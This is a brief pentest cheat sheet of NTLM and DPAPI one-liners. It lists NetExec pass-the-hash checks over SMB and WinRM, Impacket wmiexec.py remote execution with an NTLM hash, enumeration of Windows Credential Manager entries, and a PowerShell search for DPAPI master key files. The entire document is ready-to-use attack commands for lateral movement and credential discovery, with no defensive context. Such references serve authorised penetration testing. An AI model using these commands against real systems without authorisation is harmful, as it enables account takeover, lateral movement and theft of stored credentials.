# NTLM & DPAPI

Useful NTLM validation and DPAPI discovery one-liners.

### SMB pass-the-hash validation

```bash
nxc smb <HOST> -u <USER> -H <NTLM_HASH>
```

**Tool:** NetExec · **Platform:** Linux · **Tags:** NTLM, Pass-the-Hash

### WinRM pass-the-hash validation

```bash
nxc winrm <HOST> -u <USER> -H <NTLM_HASH>
```

**Tool:** NetExec · **Platform:** Linux · **Tags:** NTLM, WinRM

### Impacket WMI with hash

```bash
wmiexec.py -hashes :<NTLM_HASH> <DOMAIN>/<USER>@<HOST>
```

**Tool:** Impacket · **Platform:** Linux · **Tags:** NTLM, WMI

### List Windows Credential Manager entries

```powershell
cmdkey /list
```

**Tool:** Windows · **Platform:** Windows · **Tags:** Credentials, Discovery

### User DPAPI master key files

```powershell
Get-ChildItem "$env:APPDATA\Microsoft\Protect" -Recurse -Force -ErrorAction SilentlyContinue
```

**Tool:** PowerShell · **Platform:** Windows · **Tags:** DPAPI, Discovery

